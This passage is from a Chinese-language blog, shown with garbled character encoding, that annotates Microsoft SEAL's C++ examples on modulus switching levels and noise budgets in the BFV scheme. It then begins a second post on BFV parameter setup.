é“¾ä¸­çš„æ¯ä¸€ç»„å‚æ•°éƒ½æ¶‰åŠåˆ°æ‰§è¡Œçš„å”¯ä¸€é¢„è®¡ç®—ã€‚å½“åˆ›å»ºSEALContextå¹¶å­˜å‚¨åœ¨SEALContext::ContextDataä¸­æ—¶å¯¹è±¡ã€‚è¿™ä¸ªé“¾åŸºæœ¬ä¸Šæ˜¯SEALContext::ContextDataçš„é“¾è¡¨å¯¹è±¡ï¼Œå¹¶ä¸”å¯ä»¥åœ¨ä»»ä½•æ—¶å€™é€šè¿‡SEALContextè½»æ¾è®¿é—®ã€‚æ¯ä¸€ä¸ªèŠ‚ç‚¹å¯ä»¥é€šè¿‡å…¶ç‰¹å®šåŠ å¯†å‚æ•°çš„parms_idæ¥æ ‡è¯†(poly_modulus_degreeä¿æŒä¸å˜ï¼Œcoeff_moduluså˜åŒ–)ã€‚ EncryptionParameters parms(scheme_type::bfv); size_t poly_modulus_degree &#x3D; 8192; parms.set_poly_modulus_degree(poly_modulus_degree); åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ªè‡ªå®šä¹‰çš„coeff_modulusï¼Œ cç”±5ä¸ªè´¨æ•°ç»„æˆçš„50, 30, 30, 50, 50 ä½ç´ æ•°. CoeffModulus::MaxBitCount(poly_modulus_degree) returns 218 (greater than 50+30+30+50+50=210). ç”±äºæ¨¡é‡åˆ‡æ¢é“¾ï¼Œ5ä¸ªç´ æ•°çš„é¡ºåºæ˜¯é‡è¦çš„ã€‚æœ€åä¸€ä¸ªè´¨æ•°æœ‰ç‰¹æ®Šçš„å«ä¹‰ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºâ€œç‰¹æ®Šè´¨æ•°â€ã€‚ å› æ­¤,ç¬¬ä¸€ä¸ªå‚æ•°è®¾ç½®åœ¨æ¨¡åˆ‡æ¢é“¾åªæœ‰ä¸€ä¸ªæ¶‰åŠåˆ°ç‰¹æ®Šçš„prime åˆ›å»ºæ‰€æœ‰å¯†é’¥å¯¹è±¡ï¼Œå¦‚SecretKeyåœ¨è¿™ä¸ªæœ€é«˜çš„å±‚æ¬¡ã€‚æ‰€æœ‰æ•°æ®å¯¹è±¡ï¼Œå¦‚å¯†æ–‡ï¼Œåªèƒ½åœ¨è¾ƒä½çš„æ°´å¹³ã€‚ è¿™ä¸ªç‰¹æ®Šè´¨æ•°åº”è¯¥ä¸åœ¨coeff_modulusä¸­çš„å…¶ä»–ç´ æ•°çš„æœ€å¤§è´¨æ•°ä¸€æ ·å¤§ åœ¨SEALä¸­æœ‰ä¸€ä¸ªé‡è¦çš„levelçš„æ¦‚å¿µï¼Œæ ¹æ®ç¤ºä¾‹ä»£ç é‡Œçš„æ³¨é‡Šï¼Œå¯ä»¥ç†è§£ä¸ºSEALæ ¹æ®é»˜è®¤çš„å‚æ•°åˆ›å»ºäº†ä¸€ä¸ªmodulus switching chain ï¼Œåœ¨åŒä¸€ä¸ªé“¾ä¸Šçš„åŠ å¯†å®ä¾‹é™¤äº†coefficient modulus å…¶ä»–éƒ½ç›¸åŒã€‚ä¸‹é¢ç¤ºä¾‹ä»£ç ç»™çš„ä¸€ä¸ªè§£é‡Šï¼š special prime +---------+ | v coeff_modulus: &#123; 50, 30, 30, 50, 50 &#125; +---+ Level 4 (all keys; `key level') | | coeff_modulus: &#123; 50, 30, 30, 50 &#125; +---+ Level 3 (highest `data level') | | coeff_modulus: &#123; 50, 30, 30 &#125; +---+ Level 2 | | coeff_modulus: &#123; 50, 30 &#125; +---+ Level 1 | | coeff_modulus: &#123; 50 &#125; +---+ Level 0 (lowest level) æœ‰æ–¹ä¾¿çš„è®¿é—®æ–¹æ³• SEALContext::ContextData SEALContext::key_context_data(): access to key level ContextData SEALContext::first_context_data(): access to highest data level ContextData SEALContext::last_context_data(): access to lowest level ContextData è¿™æ˜¯é€šè¿‡set_coeff_modulus(CoeffModulus::Create(poly_modulus_degree, &#123; 50, 30, 30, 50, 50 &#125;)) æ–¹æ³•è®¾ç½®çš„ æ‰“å°ä¿¡æ¯æŸ¥çœ‹ éªŒè¯keysçº§åˆ«ã€‚ KeyGenerator keygen(context); auto secret_key = keygen.secret_key(); PublicKey public_key; keygen.create_public_key(public_key); RelinKeys relin_keys; keygen.create_relin_keys(relin_keys); print_line(__LINE__); cout &lt;&lt; \"Print the parameter IDs of generated elements.\" &lt;&lt; endl; cout &lt;&lt; \" + public_key: \" &lt;&lt; public_key.parms_id() &lt;&lt; endl; cout &lt;&lt; \" + secret_key: \" &lt;&lt; secret_key.parms_id() &lt;&lt; endl; cout &lt;&lt; \" + relin_keys: \" &lt;&lt; relin_keys.parms_id() &lt;&lt; endl; éªŒè¯å¯†æ–‡Ciphertextçº§åˆ« Plaintext plain(\"1x^3 + 2x^2 + 3x^1 + 4\"); Ciphertext encrypted; encryptor.encrypt(plain, encrypted); cout &lt;&lt; \" + plain: \" &lt;&lt; plain.parms_id() &lt;&lt; \" (not set in BFV)\" &lt;&lt; endl; cout &lt;&lt; \" + encrypted: \" &lt;&lt; encrypted.parms_id() &lt;&lt; endl &lt;&lt; endl; â€œModulus switchingâ€ â€œModulus switchingâ€æ˜¯ä¸€ç§é™ä½å¯†æ–‡å‚æ•°çš„æŠ€æœ¯åœ¨é“¾ä¸­ Evaluator::mod_switch_to_nextæ€»æ˜¯åˆ‡æ¢åˆ° ä¸‹ä¸€çº§é“¾ï¼Œè€ŒEvaluator::mod_switch_toåˆ‡æ¢åˆ°åœ¨å¯¹åº”äºç»™å®šparms_idçš„é“¾ä¸Šè®¾ç½®çš„å‚æ•°ã€‚ç„¶è€Œ,å®ƒ æ˜¯ä¸å¯èƒ½åœ¨é“¾æ¡å‘ä¸Šåˆ‡æ¢çš„ã€‚ éªŒè¯: code print_line(__LINE__); cout &lt;&lt; \"Perform modulus switching on encrypted and print.\" &lt;&lt; endl; context_data = context.first_context_data(); cout &lt;&lt; \"---->\"; while (context_data->next_context_data()) &#123; cout &lt;&lt; \" Level (chain index): \" &lt;&lt; context_data->chain_index() &lt;&lt; endl; cout &lt;&lt; \" parms_id of encrypted: \" &lt;&lt; encrypted.parms_id() &lt;&lt; endl; cout &lt;&lt; \" Noise budget at this level: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted) &lt;&lt; \" bits\" &lt;&lt; endl; cout &lt;&lt; \"\\\\\" &lt;&lt; endl; cout &lt;&lt; \" \\\\-->\"; evaluator.mod_switch_to_next_inplace(encrypted); context_data = context_data->next_context_data(); &#125; cout &lt;&lt; \" Level (chain index): \" &lt;&lt; context_data->chain_index() &lt;&lt; endl; cout &lt;&lt; \" parms_id of encrypted: \" &lt;&lt; encrypted.parms_id() &lt;&lt; endl; cout &lt;&lt; \" Noise budget at this level: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted) &lt;&lt; \" bits\" &lt;&lt; endl; cout &lt;&lt; \"\\\\\" &lt;&lt; endl; cout &lt;&lt; \" \\\\-->\"; cout &lt;&lt; \" End of chain reached\" &lt;&lt; endl &lt;&lt; endl; æºä»£ç  code #include \"examples.h\" #include \"seal/seal.h\" using namespace std; using namespace seal; void example_levels() &#123; print_example_banner(\"Example: Levels\"); EncryptionParameters parms(scheme_type::bfv); size_t poly_modulus_degree = 8192; parms.set_poly_modulus_degree(poly_modulus_degree); /* åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ªè‡ªå®šä¹‰çš„coeff_modulusï¼Œ cç”±5ä¸ªè´¨æ•°ç»„æˆçš„50, 30, 30, 50, 50 ä½ç´ æ•°. CoeffModulus::MaxBitCount(poly_modulus_degree) returns 218 (greater than 50+30+30+50+50=210). ç”±äºæ¨¡é‡åˆ‡æ¢é“¾ï¼Œ5ä¸ªç´ æ•°çš„é¡ºåºæ˜¯é‡è¦çš„ã€‚æœ€åä¸€ä¸ªè´¨æ•°æœ‰ç‰¹æ®Šçš„å«ä¹‰ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºâ€œç‰¹æ®Šè´¨æ•°â€ã€‚ å› æ­¤,ç¬¬ä¸€ä¸ªå‚æ•°è®¾ç½®åœ¨æ¨¡åˆ‡æ¢é“¾åªæœ‰ä¸€ä¸ªæ¶‰åŠåˆ°ç‰¹æ®Šçš„prime åˆ›å»ºæ‰€æœ‰å¯†é’¥å¯¹è±¡ï¼Œå¦‚SecretKeyåœ¨è¿™ä¸ªæœ€é«˜çš„å±‚æ¬¡ã€‚æ‰€æœ‰æ•°æ®å¯¹è±¡ï¼Œå¦‚å¯†æ–‡ï¼Œåªèƒ½åœ¨è¾ƒä½çš„æ°´å¹³ã€‚ è¿™ä¸ªç‰¹æ®Šè´¨æ•°åº”è¯¥ä¸åœ¨coeff_modulusä¸­çš„å…¶ä»–ç´ æ•°çš„æœ€å¤§è´¨æ•°ä¸€æ ·å¤§ special prime +---------+ | v coeff_modulus: &#123; 50, 30, 30, 50, 50 &#125; +---+ Level 4 (all keys; `key level') | | coeff_modulus: &#123; 50, 30, 30, 50 &#125; +---+ Level 3 (highest `data level') | | coeff_modulus: &#123; 50, 30, 30 &#125; +---+ Level 2 | | coeff_modulus: &#123; 50, 30 &#125; +---+ Level 1 | | coeff_modulus: &#123; 50 &#125; +---+ Level 0 (lowest level) */ parms.set_coeff_modulus(CoeffModulus::Create(poly_modulus_degree, &#123; 50, 30, 30, 50, 50 &#125;)); /* åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œplain_modulusæ²¡æœ‰å‘æŒ¥å¤ªå¤§çš„ä½œç”¨;æˆ‘ä»¬é€‰æ‹©ä¸€äº›åˆç†çš„ä»·å€¼ */ parms.set_plain_modulus(PlainModulus::Batching(poly_modulus_degree, 20)); SEALContext context(parms); print_parameters(context); cout &lt;&lt; endl; /* * æœ‰æ–¹ä¾¿çš„è®¿é—®æ–¹æ³• SEALContext::ContextData SEALContext::key_context_data(): access to key level ContextData SEALContext::first_context_data(): access to highest data level ContextData SEALContext::last_context_data(): access to lowest level ContextData */ //éå†è¯¥é“¾å¹¶æ‰“å°æ¯ç»„å‚æ•°çš„parms_idã€‚ //é¦–å…ˆæ‰“å°å…³é”®çº§åˆ«å‚æ•°ä¿¡æ¯ print_line(__LINE__); cout &lt;&lt; \"Print the modulus switching chain.\" &lt;&lt; endl; auto context_data = context.key_context_data(); cout &lt;&lt; \"----> Level (chain index): \" &lt;&lt; context_data->chain_index(); cout &lt;&lt; \" ...... key_context_data()\" &lt;&lt; endl; cout &lt;&lt; \" parms_id: \" &lt;&lt; context_data->parms_id() &lt;&lt; endl; cout &lt;&lt; \" coeff_modulus primes: \"; cout &lt;&lt; hex; for (const auto&amp; prime : context_data->parms().coeff_modulus()) &#123; cout &lt;&lt; prime.value() &lt;&lt; \" \"; &#125; cout &lt;&lt; dec &lt;&lt; endl; cout &lt;&lt; \"\\\\\" &lt;&lt; endl; cout &lt;&lt; \" \\\\-->\"; //æ¥ä¸‹æ¥è¿­ä»£å…¶ä½™çš„ context_data = context.first_context_data(); while (context_data) &#123; cout &lt;&lt; \" Level (chain index): \" &lt;&lt; context_data->chain_index(); if (context_data->parms_id() == context.first_parms_id()) &#123; cout &lt;&lt; \" ...... first_context_data()\" &lt;&lt; endl; &#125; else if (context_data->parms_id() == context.last_parms_id()) &#123; cout &lt;&lt; \" ...... last_context_data()\" &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; endl; &#125; cout &lt;&lt; \" parms_id: \" &lt;&lt; context_data->parms_id() &lt;&lt; endl; cout &lt;&lt; \" coeff_modulus primes: \"; cout &lt;&lt; hex; // 16è¿›åˆ¶è¾“å‡º for (const auto&amp; prime : context_data->parms().coeff_modulus()) &#123; cout &lt;&lt; prime.value() &lt;&lt; \" \"; &#125; cout &lt;&lt; dec &lt;&lt; endl; cout &lt;&lt; \"\\\\\" &lt;&lt; endl; cout &lt;&lt; \" \\\\-->\"; /* Step forward in the chain. */ context_data = context_data->next_context_data(); &#125; cout &lt;&lt; \" End of chain reached\" &lt;&lt; endl &lt;&lt; endl; //æˆ‘ä»¬åˆ›å»ºä¸€äº›keyså¹¶æ£€æŸ¥å®ƒä»¬æ˜¯å¦ç¡®å®å‡ºç°åœ¨æœ€é«˜å±‚ã€‚ KeyGenerator keygen(context); auto secret_key = keygen.secret_key(); PublicKey public_key; keygen.create_public_key(public_key); RelinKeys relin_keys; keygen.create_relin_keys(relin_keys); print_line(__LINE__); cout &lt;&lt; \"Print the parameter IDs of generated elements.\" &lt;&lt; endl; cout &lt;&lt; \" + public_key: \" &lt;&lt; public_key.parms_id() &lt;&lt; endl; cout &lt;&lt; \" + secret_key: \" &lt;&lt; secret_key.parms_id() &lt;&lt; endl; cout &lt;&lt; \" + relin_keys: \" &lt;&lt; relin_keys.parms_id() &lt;&lt; endl; Encryptor encryptor(context, public_key); Evaluator evaluator(context); Decryptor decryptor(context, secret_key); /* * åœ¨BFVæ–¹æ¡ˆä¸­ï¼Œæ˜æ–‡ä¸æºå¸¦parms_idï¼Œè€Œå¯†æ–‡æºå¸¦parms_idã€‚ è¯·æ³¨æ„æ–°åŠ å¯†çš„å¯†æ–‡å¦‚ä½•åœ¨æœ€é«˜æ•°æ®çº§åˆ«ã€‚ */ Plaintext plain(\"1x^3 + 2x^2 + 3x^1 + 4\"); Ciphertext encrypted; encryptor.encrypt(plain, encrypted); cout &lt;&lt; \" + plain: \" &lt;&lt; plain.parms_id() &lt;&lt; \" (not set in BFV)\" &lt;&lt; endl; cout &lt;&lt; \" + encrypted: \" &lt;&lt; encrypted.parms_id() &lt;&lt; endl &lt;&lt; endl; /* * â€œModulus switchingâ€æ˜¯ä¸€ç§é™ä½å¯†æ–‡å‚æ•°çš„æŠ€æœ¯åœ¨é“¾ä¸­ Evaluator::mod_switch_to_nextæ€»æ˜¯åˆ‡æ¢åˆ° ä¸‹ä¸€çº§é“¾ï¼Œè€ŒEvaluator::mod_switch_toåˆ‡æ¢åˆ°åœ¨å¯¹åº”äºç»™å®šparms_idçš„é“¾ä¸Šè®¾ç½®çš„å‚æ•°ã€‚ç„¶è€Œ,å®ƒ æ˜¯ä¸å¯èƒ½åœ¨é“¾æ¡å‘ä¸Šåˆ‡æ¢çš„ã€‚ */ print_line(__LINE__); cout &lt;&lt; \"Perform modulus switching on encrypted and print.\" &lt;&lt; endl; context_data = context.first_context_data(); cout &lt;&lt; \"---->\"; while (context_data->next_context_data()) &#123; cout &lt;&lt; \" Level (chain index): \" &lt;&lt; context_data->chain_index() &lt;&lt; endl; cout &lt;&lt; \" parms_id of encrypted: \" &lt;&lt; encrypted.parms_id() &lt;&lt; endl; cout &lt;&lt; \" Noise budget at this level: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted) &lt;&lt; \" bits\" &lt;&lt; endl; cout &lt;&lt; \"\\\\\" &lt;&lt; endl; cout &lt;&lt; \" \\\\-->\"; evaluator.mod_switch_to_next_inplace(encrypted); context_data = context_data->next_context_data(); &#125; cout &lt;&lt; \" Level (chain index): \" &lt;&lt; context_data->chain_index() &lt;&lt; endl; cout &lt;&lt; \" parms_id of encrypted: \" &lt;&lt; encrypted.parms_id() &lt;&lt; endl; cout &lt;&lt; \" Noise budget at this level: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted) &lt;&lt; \" bits\" &lt;&lt; endl; cout &lt;&lt; \"\\\\\" &lt;&lt; endl; cout &lt;&lt; \" \\\\-->\"; cout &lt;&lt; \" End of chain reached\" &lt;&lt; endl &lt;&lt; endl; /* åœ¨è¿™ä¸€ç‚¹ä¸Šï¼Œå¾ˆéš¾çœ‹åˆ°è¿™æ ·åšæœ‰ä»»ä½•å¥½å¤„:æˆ‘ä»¬æŸå¤±äº†å·¨å¤§å™ªéŸ³é¢„ç®—(å³è®¡ç®—èƒ½åŠ›)æ²¡æœ‰ä»»ä½•å›æŠ¥ã€‚ è§£å¯†ä»èƒ½å·¥ä½œã€‚ ç„¶è€Œï¼Œæœ‰ä¸€ä¸ªéšè—çš„å¥½å¤„:å¯†æ–‡çš„å¤§å°å–å†³äºç³»æ•°æ¨¡æ•°ä¸­ç´ æ•°æ•°çš„çº¿æ€§å…³ç³»ã€‚ å› æ­¤,å¦‚æœæœ‰ä¸éœ€è¦æˆ–ä¸æ‰“ç®—å¯¹ç»™å®šçš„å¯¹è±¡æ‰§è¡Œä»»ä½•è¿›ä¸€æ­¥çš„è®¡ç®—å¯†æ–‡ï¼Œ æˆ‘ä»¬ä¸å¦¨æŠŠå®ƒåˆ‡æ¢åˆ°æœ€å°çš„(æœ€åçš„)é›†åˆå‚æ•°ï¼Œç„¶åå°†å…¶å‘é€å›å¯†é’¥æŒæœ‰è€…è§£å¯†ã€‚ æ­¤å¤–ï¼Œå™ªéŸ³æŸå¤±é¢„ç®—å®é™…ä¸Šæ ¹æœ¬ä¸æ˜¯ä¸€ä¸ªé—®é¢˜ */ print_line(__LINE__); cout &lt;&lt; \"Decrypt still works after modulus switching.\" &lt;&lt; endl; decryptor.decrypt(encrypted, plain); cout &lt;&lt; \" + Decryption of encrypted: \" &lt;&lt; plain.to_string(); cout &lt;&lt; \" ...... Correct.\" &lt;&lt; endl &lt;&lt; endl; /* * å› æ­¤,å¦‚æœæœ‰ä¸éœ€è¦æˆ–ä¸æ‰“ç®—å¯¹ç»™å®šçš„å¯¹è±¡æ‰§è¡Œä»»ä½•è¿›ä¸€æ­¥çš„è®¡ç®—å¯†æ–‡ï¼Œ * æˆ‘ä»¬ä¸å¦¨æŠŠå®ƒåˆ‡æ¢åˆ°æœ€å°çš„(æœ€åçš„)é›†åˆå‚æ•°ï¼Œç„¶åå°†å…¶å‘é€å›å¯†é’¥æŒæœ‰è€…è§£å¯†ã€‚ * æ­¤å¤–ï¼Œå™ªéŸ³æŸå¤±é¢„ç®—å®é™…ä¸Šæ ¹æœ¬ä¸æ˜¯ä¸€ä¸ªé—®é¢˜ * é¦–å…ˆï¼Œæˆ‘ä»¬é‡æ–°åˆ›å»ºåŸå§‹å¯†æ–‡å¹¶æ‰§è¡Œä¸€äº›è®¡ç®—ã€‚ * */ cout &lt;&lt; \"Computation is more efficient with modulus switching.\" &lt;&lt; endl; print_line(__LINE__); cout &lt;&lt; \"Compute the 8th power.\" &lt;&lt; endl; encryptor.encrypt(plain, encrypted); cout &lt;&lt; \" + Noise budget fresh: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted) &lt;&lt; \" bits\" &lt;&lt; endl; evaluator.square_inplace(encrypted); evaluator.relinearize_inplace(encrypted, relin_keys); cout &lt;&lt; \" + Noise budget of the 2nd power: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted) &lt;&lt; \" bits\" &lt;&lt; endl; evaluator.square_inplace(encrypted); evaluator.relinearize_inplace(encrypted, relin_keys); cout &lt;&lt; \" + Noise budget of the 4th power: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted) &lt;&lt; \" bits\" &lt;&lt; endl; /* åœ¨è¿™ç§æƒ…å†µä¸‹ modulus switching å¯¹å™ªå£°é¢„ç®—å®Œå…¨æ²¡æœ‰å½±å“ã€‚ */ evaluator.mod_switch_to_next_inplace(encrypted); cout &lt;&lt; \" + Noise budget after modulus switching: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted) &lt;&lt; \" bits\" &lt;&lt; endl; /* * è¿™æ„å‘³ç€é™ä½ä¸€äº›ç³»æ•°æ˜¯æ²¡æœ‰ä»»ä½•å®³å¤„çš„åœ¨åšäº†è¶³å¤Ÿçš„è®¡ç®—ä¹‹åã€‚ * åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œäººä»¬å¯èƒ½ç¨å¾®æ—©ä¸€ç‚¹åˆ‡æ¢åˆ°ä¸€ä¸ªè¾ƒä½çš„çº§åˆ«ï¼Œå®é™…ä¸Šç‰ºç‰²äº†ä¸€äº›è¿‡ç¨‹ä¸­çš„å™ªéŸ³é¢„ç®— * ä»¥ç”¨æ›´å°çš„å‚æ•°æ¥è·å¾—è®¡ç®—æ€§èƒ½ * æˆ‘ä»¬ä»æ‰“å°å‡ºæ¥çš„æ•°æ®ä¸­å¯ä»¥çœ‹åˆ°ï¼Œå½“å™ªéŸ³é¢„ç®—é™åˆ°25ä½å·¦å³æ—¶ï¼Œä¸‹ä¸€ä¸ªmodulus switchåº”è¯¥ç†æƒ³åœ°å®Œæˆã€‚ */ evaluator.square_inplace(encrypted); evaluator.relinearize_inplace(encrypted, relin_keys); cout &lt;&lt; \" + Noise budget of the 8th power: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted) &lt;&lt; \" bits\" &lt;&lt; endl; evaluator.mod_switch_to_next_inplace(encrypted); cout &lt;&lt; \" + Noise budget after modulus switching: \" &lt;&lt; decryptor.invariant_noise_budget(encrypted) &lt;&lt; \" bits\" &lt;&lt; endl; /* * æ­¤æ—¶ï¼Œå¯†æ–‡ä»èƒ½æ­£ç¡®è§£å¯†ï¼Œä½“ç§¯å¾ˆå°ï¼Œè€Œä¸”è®¡ç®—æ•ˆç‡ä¹Ÿå°½å¯èƒ½é«˜ã€‚ * æ³¨æ„ï¼Œè§£å¯†å™¨å¯ä»¥ç”¨æ¥è§£å¯†åœ¨modulus switchingé“¾ä¸­ä»»æ„å±‚æ¬¡ä¸€ä¸ªå¯†æ–‡ */ decryptor.decrypt(encrypted, plain); cout &lt;&lt; \" + Decryption of the 8th power (hexadecimal) ...... Correct.\" &lt;&lt; endl; cout &lt;&lt; \" \" &lt;&lt; plain.to_string() &lt;&lt; endl &lt;&lt; endl; /* * åœ¨BFVä¸­ä¸éœ€è¦modulus switching * åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç”¨æˆ·å¯èƒ½ä¼šä¸æƒ³åˆ›å»ºmodulus switchingé“¾ï¼Œ * åªå®ç°æœ€é«˜çš„ä¸¤ä¸ªlevelï¼ˆkey level and highest data level) * è¿™å¯ä»¥é€šè¿‡å°†boolå€¼' false'ä¼ é€’ç»™SEALContextçš„æ„é€ å‡½æ•°æ¥å®ç°ã€‚ */ context = SEALContext(parms, false); /* * æˆ‘ä»¬å¯ä»¥æ£€æŸ¥ç¡®å®åªåˆ›å»ºäº†æ¨¡æ•°äº¤æ¢é“¾æœ€é«˜çš„ä¸¤å±‚ */ cout &lt;&lt; \"Optionally disable modulus switching chain expansion.\" &lt;&lt; endl; print_line(__LINE__); cout &lt;&lt; \"Print the modulus switching chain.\" &lt;&lt; endl; cout &lt;&lt; \"---->\"; for (context_data = context.key_context_data(); context_data; context_data = context_data->next_context_data()) &#123; cout &lt;&lt; \" Level (chain index): \" &lt;&lt; context_data->chain_index() &lt;&lt; endl; cout &lt;&lt; \" parms_id: \" &lt;&lt; context_data->parms_id() &lt;&lt; endl; cout &lt;&lt; \" coeff_modulus primes: \"; cout &lt;&lt; hex; for (const auto&amp; prime : context_data->parms().coeff_modulus()) &#123; cout &lt;&lt; prime.value() &lt;&lt; \" \"; &#125; cout &lt;&lt; dec &lt;&lt; endl; cout &lt;&lt; \"\\\\\" &lt;&lt; endl; cout &lt;&lt; \" \\\\-->\"; &#125; cout &lt;&lt; \" End of chain reached\" &lt;&lt; endl &lt;&lt; endl; return; &#125;","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Microsoft SEAL","slug":"æŠ€æœ¯å‘/Microsoft-SEAL","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Microsoft-SEAL/"}],"tags":[{"name":"Seal","slug":"Seal","permalink":"https://www.sizaif.com/tags/Seal/"},{"name":"åŒæ€åŠ å¯†","slug":"åŒæ€åŠ å¯†","permalink":"https://www.sizaif.com/tags/%E5%90%8C%E6%80%81%E5%8A%A0%E5%AF%86/"}],"author":"sizaif"},{"title":"SEALå­¦ä¹ ç¬¬ä¸€å¤©-Bfv_basicsä½¿ç”¨ç”¨æ³•","slug":"SEALå­¦ä¹ ç¬¬ä¸€å¤©-bfv-basicsä½¿ç”¨ç”¨æ³•","date":"2021-08-11T14:01:34.000Z","updated":"2021-08-14T14:15:24.837Z","comments":true,"path":"posts/9959b7cc/","link":"","permalink":"https://www.sizaif.com/posts/9959b7cc/","excerpt":"","text":"@auther by sizaif SEALå­¦ä¹ ç¬¬ä¸€å¤©ï¼š bfv_basicsä½¿ç”¨ç”¨æ³• @TOC bfv_basics ä¸€ parmsç±» åˆ›å»ºä¸€ä¸ªHEæ–¹æ¡ˆç±» parmsç±»éœ€è¦çš„3ä¸ªå‚æ•° poly_modulus_degree (degree of polynomial modulus å¤šé¡¹å¼æ¨¡çš„æ¬¡æ•°); coeff_modulus ([ciphertext] coefficient modulus ç³»æ•°æ¨¡); plain_modulus (plaintext modulus; only for the BFV scheme). MOD X, å°†ç»“æœMODåˆ°Xå†… ç”¨æ³• å‚æ•° è§£é‡Šè¯´æ˜ EncryptionParameters parms(); scheme_type::bfv åˆ›å»ºä¸€ä¸ªHEä»¥BFVæ–¹æ¡ˆç±» size_t poly_modulus_degree = 4096; integear [size_t poly_modulus_degree](###size_t poly_modulus_degree) parms.set_poly_modulus_degree(); poly_modulus_degree parms.set_coeff_modulus()ï¼› CoeffModulus::BFVDefault(poly_modulus_degree) poly_modulus_degree parms.set_plain_modulus(1024); integear MOD context.parameter_error_message() è¾“å‡ºæŠ¥é”™ä¿¡æ¯ SEALContext context(parms); åˆ›å»ºSEALContextç±» EncryptionParameters parms(scheme_type::bfv); The BFV scheme cannot perform arbitrary computations on encrypted data. Instead, each ciphertext has a specific quantity called the `invariant noise budget' -- or `noise budget' for short -- measured in bits. The noise budget in a freshly encrypted ciphertext (initial noise budget) is determined by the encryption parameters. Homomorphic operations consume the noise budget at a rate also determined by the encryption parameters. In BFV the two basic operations allowed on encrypted data are additions and multiplications, of which additions can generally be thought of as being nearly free in terms of noise budget consumption compared to multiplications. Since noise budget consumption compounds in sequential multiplications, the most significant factor in choosing appropriate encryption parameters is the multiplicative depth of the arithmetic circuit that the user wants to evaluate on encrypted data. Once the noise budget of a ciphertext reaches zero it becomes too corrupted to be decrypted. Thus, it is essential to choose the parameters to be large enough to support the desired computation; otherwise the result is impossible to make sense of even with the secret key. åŸºæœ¬è¿ç®—: åŠ æ³• å’Œä¹˜æ³• In BFV the two basic operations allowed on encrypted data are additions and multiplications åŸºæœ¬è¿ç®—: åŠ æ³• å’Œä¹˜æ³• size_t poly_modulus_degree = 4096; size_t poly_modulus_degree å¤šé¡¹å¼æ¨¡â€çš„æ¬¡æ•°,2çš„å€æ•°;1024, 2048, 4096, 8192, 16384, 32768, parms.set_poly_modulus_degree(poly_modulus_degree); parms.set_coeff_modulus(CoeffModulus::BFVDefault(poly_modulus_degree)); coeff_modulus code [ciphertext] `coefficient modulusâ€™ (coeff_modulus) [å¯†æ–‡]â€˜ç³»æ•°æ¨¡é‡â€™ (coeff_modulus)Microsoft SEAL comes with helper functions for selecting the coeff_modulus.For new users the easiest way is to simply useç®€å•è°ƒç”¨:CoeffModulus::BFVDefault(poly_modulus_degree),è¿”å›vectorç±»å‹which returns std::vector consisting of a generally good choicefor the given poly_modulus_degree.æ¨¡é•¿åº¦å¯¹åº”ç´ æ•°é•¿åº¦Â±---------------------------------------------------+| poly_modulus_degree | max coeff_modulus bit-length |Â±--------------------Â±-----------------------------+| 1024 | 27 || 2048 | 54 || 4096 | 109 || 8192 | 218 || 16384 | 438 || 32768 | 881 |Â±--------------------Â±-----------------------------+ parms.set_plain_modulus(1024); MOD ~ log2(coeff_modulus/plain_modulus) (bits) å™ªå£°é¢„ç®—è®¡ç®—æ–¹å¼: and the noise budget consumption in a homomorphic multiplication is of the form log2(plain_modulus) + (other terms). æ˜æ–‡æ¨¡é‡æ˜¯BFVæ ¼å¼ç‰¹æœ‰çš„ï¼Œä½¿ç”¨CKKSæ ¼å¼æ—¶ä¸èƒ½è®¾ç½®æ˜æ–‡æ¨¡é‡ã€‚ æ—¢ç„¶æ‰€æœ‰å‚æ•°éƒ½è®¾ç½®å¥½äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„å»ºä¸€ä¸ªSEALContextäº† å¯¹è±¡ã€‚ç±»çš„æœ‰æ•ˆæ€§å’Œå±æ€§æ˜¯ä¸€ä¸ªé‡ç±» æˆ‘ä»¬åˆšåˆšè®¾ç½®çš„å‚æ•°ã€‚ æ¼”ç¤ºcode EncryptionParameters parms(scheme_type::bfv); //å£°æ˜HE ä½¿ç”¨çš„æ¨¡å¼ // è®¾ç½® 3 ä¸ªå‚æ•° size_t poly_modulus_degree = 4096; parms.set_poly_modulus_degree(poly_modulus_degree); parms.set_coeff_modulus(CoeffModulus::BFVDefault(poly_modulus_degree)); parms.set_plain_modulus(1024); // æ˜æ–‡ MODæ•° (2çš„å€æ•°, ç´ æ•°æœ€å¥½) //åˆ›å»ºä¸€ä¸ªcontext SEALContext context(parms); //å½“ä½¿ç”¨å‚æ•°åˆ›å»ºSEALContextæ—¶ï¼ŒMicrosoft SEALå°†é¦–å…ˆåˆ›å»ºéªŒè¯è¿™äº›å‚æ•°ã€‚è¿™é‡Œé€‰æ‹©çš„å‚æ•°æ˜¯æœ‰æ•ˆçš„ã€‚ cout &lt;&lt; \"Parameter validation (success): \" &lt;&lt; context.parameter_error_message() &lt;&lt; endl; äºŒ KeyGeneratorç±» å…¬é’¥åŠ å¯†æ–¹æ¡ˆæœ‰ä¸€ä¸ªç”¨äºåŠ 